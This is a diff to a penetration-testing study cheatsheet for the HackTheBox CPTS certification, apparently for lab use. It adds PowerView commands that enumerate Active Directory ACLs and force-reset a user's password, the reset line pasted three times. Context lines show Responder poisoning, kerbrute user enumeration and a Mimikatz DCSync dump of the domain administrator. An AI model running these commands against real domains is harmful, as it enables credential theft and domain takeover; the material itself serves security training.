@@ -67,7 +67,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [Active Directory](#active-directory)
     - [Tools of the Trade](#Tools-of-the-Trade)
     - [Initial Enumeration](#initial-enumeration)
-    - [LLMNR/NTB-NS Poisoning](#llmnr-poisoning)
+    - [LLMNR/NTB-NS Poisoning](#llmnr/NTB-NS-poisoning)
     - [Password Spraying & Password Policies](#password-spraying-and-password-policies)
     - [Enumerating Disabling/Bypassing AV](#enumerating-and-bypassing-av)
     - [Enumerating Security Controls](#Enumerating-Security-Controls)
@@ -1218,7 +1218,7 @@ sudo git clone https://github.com/ropnop/kerbrute.git
 sudo make all
 ./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
 ```
-##### LLMNR Poisoning
+##### LLMNR/NTB-NS Poisoning
 ```
 # LLMNR/NBT-NS Poisoning - from Linux
 sudo responder -I ens224 
@@ -1900,6 +1900,29 @@ Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley
 $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
 
+# Used to find all Windows domain objects that the user has rights over by mapping the user's SID to the SecurityIdentifier property from a Windows-based host.
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+# Used to perform a reverse search & map to a GUID value from a Windows-based host.
+$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl
+
+# Used to discover a domain object's ACL by performing a search based on GUID's (-ResolveGUIDs) from a Windows-based host.
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+# Used to discover a group of user accounts in a target Windows domain and add the output to a text file (ad_users.txt) from a Windows-based host.
+Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+
+# A foreach loop used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(ad_users.txt) to the Get-ADUser cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.
+foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
+
+
+# PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+# PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+
 # PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
 Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
 
@@ -1916,8 +1939,7 @@ Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname=
 ##### DCSync Attack
 ```
 # PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
-Get-DomainUser -Identity adunn | sel
-ect samaccountname,objectsid,memberof,useraccountcontrol |fl
+Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol |fl
 
 # Uses Mimikatz to perform a dcsync attack from a Windows-based host.
 mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
